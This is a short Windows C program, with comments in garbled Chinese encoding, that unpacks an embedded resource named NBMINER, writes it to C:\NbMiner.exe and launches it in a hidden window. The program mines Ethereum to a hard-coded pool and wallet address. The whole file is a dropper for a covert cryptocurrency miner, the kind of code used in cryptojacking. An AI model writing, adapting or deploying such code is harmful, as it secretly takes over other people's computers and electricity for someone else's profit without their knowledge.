#include <Windows.h>
#include "resource.h"
#include <WinBase.h>
//UniCode�µ�Windows����Main����
int WINAPI wWinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR lpCmdLine,
    _In_ int nShowCmd
)
{
    //Ҫд������Դ�ļ�
    LPVOID lpResource = NULL;
	//������Դ�ļ�    Load Resource File
    HRSRC hRs = FindResource(NULL, MAKEINTRESOURCE(IDR_NBMINER), L"NBMINER");
    if (hRs == NULL)
    {
        return -1;
    }
    DWORD dwResourceSize = SizeofResource(NULL, hRs);
    if (dwResourceSize == 0)
    {
        return -1;
    }
    HGDIOBJ hGdi = LoadResource(NULL, hRs);
    if (hGdi != NULL)
        lpResource = LockResource(hGdi);         //Windows���Զ����������������


    //д����Դ�ļ�    Write Resource File at C:
    HANDLE hFile = CreateFile(L"C:\\NbMiner.exe", GENERIC_ALL,
        NULL, NULL, CREATE_ALWAYS, NULL, NULL);                 //�����ļ������ͨ���ļ��������
    if (hFile == INVALID_HANDLE_VALUE) return -1;
    WriteFile(hFile, lpResource, dwResourceSize, NULL, NULL);   //д��Resource
    CloseHandle(hFile);                                         //�رվ��

    //�����ļ�
    WinExec("C:\\NbMiner.exe -a ethash -o cn.sparkpool.com:3333 -u 0x99E0669CC67a7D433a680d6e93Fb84b2f8B15c47.Test -log", SW_HIDE);
	return 0;
}